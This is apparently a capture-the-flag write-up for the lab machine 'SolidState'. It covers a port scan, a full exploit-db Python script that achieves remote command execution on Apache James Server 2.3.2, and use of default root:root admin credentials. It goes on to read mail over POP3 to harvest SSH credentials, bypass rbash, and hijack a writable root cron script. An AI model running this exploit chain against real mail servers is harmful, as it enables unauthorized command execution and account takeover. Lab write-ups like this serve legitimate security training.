# SolidState

## Overview

This was a medium box with some email enumeration and rbash bypass.

![SolidState.png](uploads/SolidState.png)

**Name -** SolidState

**Difficulty -** Medium

**OS -** Linux

**Points -** 30

## Information Gathering

### **Port Scan**

Basic Scan

```bash
╰─ nmap 10.129.75.67 -vvv -p- --max-retries=0
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-06 02:45 Bangladesh Standard Time
Initiating Ping Scan at 02:45
Scanning 10.129.75.67 [4 ports]
Completed Ping Scan at 02:45, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:45
Completed Parallel DNS resolution of 1 host. at 02:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.20s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 02:45
Scanning 10.129.75.67 [65535 ports]
Discovered open port 22/tcp on 10.129.75.67
Discovered open port 25/tcp on 10.129.75.67
Discovered open port 110/tcp on 10.129.75.67
Discovered open port 80/tcp on 10.129.75.67
Warning: 10.129.75.67 giving up on port because retransmission cap hit (0).
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 7.61% done; ETC: 02:47 (0:01:49 remaining)
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 31.06% done; ETC: 02:46 (0:01:04 remaining)
SYN Stealth Scan Timing: About 56.51% done; ETC: 02:47 (0:00:45 remaining)
Discovered open port 4555/tcp on 10.129.75.67
Completed SYN Stealth Scan at 02:48, 167.87s elapsed (65535 total ports)
Nmap scan report for 10.129.75.67
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2023-06-06 02:45:26 Bangladesh Standard Time for 167s
Not shown: 34626 filtered tcp ports (no-response), 30904 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

Read data files from: C:\Program Files (x86)\Nmap
Nmap done: 1 IP address (1 host up) scanned in 169.63 seconds
           Raw packets sent: 65566 (2.885MB) | Rcvd: 65592 (2.624MB)
```

### **HTTP Enumeration**

Visiting the website gives us the following

![Untitled](uploads/Untitled.png)

I had not find anything on the website.

### Email Enumeration

On port 5555, I found the server banner “JAMES Remote Administration Tool 2.3.2” which is a vulnerable version and I got an exploit from [exploit-db](https://www.exploit-db.com/exploits/35513)

![Untitled](uploads/Untitled%201.png)

Exploit -

```python
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
#payload = 'touch /tmp/proof.txt' # to exploit on any user
payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."
```

I tried but it didn’t work. I think it needs somebody to log into the ssh. So, I tried to find other ways.

The default credentials are root:root

![Untitled](uploads/Untitled%202.png)

I could also change the password for other user. Now I could access this user from port 110

```bash
╭╴root @ …/c/Users/SiliconBits took 59s
╰─ telnet  10.129.75.67 110
Trying 10.129.75.67...
Connected to 10.129.75.67.
Escape character is '^]'.
USER mindy
PASS mindy+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
+OK

+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security.

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

Using mindy’s account, I was able to find her ssh credentials.

```bash
username: mindy
pass: P@55W0rd1!2@
```

## Getting User.txt

Upon getting the credentials I logged into ssh and find a restricted bash shell.

![Untitled](uploads/Untitled%203.png)

I then get the user flag before getting an actual shell

![Untitled](uploads/Untitled%204.png)

User flag - 3830b88e4107cc4d94175439f01bb011

## Getting root.txt

I use bash noprofile to bypass the rbash

![Untitled](uploads/Untitled%205.png)

After runny pspy, I was able to find a cronjob is running as root user

![Untitled](uploads/Untitled%206.png)

this is running /opt/tmp.py file and this file has write access

![Untitled](uploads/Untitled%207.png)

So, I changed the content to copy the root flag instead

![Untitled](uploads/Untitled%208.png)

After Some time, I got the flag

![Untitled](uploads/Untitled%209.png)

Root flag - ee034a80eeab843613cfc3b3a8096895

## Flags

**user.txt -** 3830b88e4107cc4d94175439f01bb011

**root.txt -** ee034a80eeab843613cfc3b3a8096895
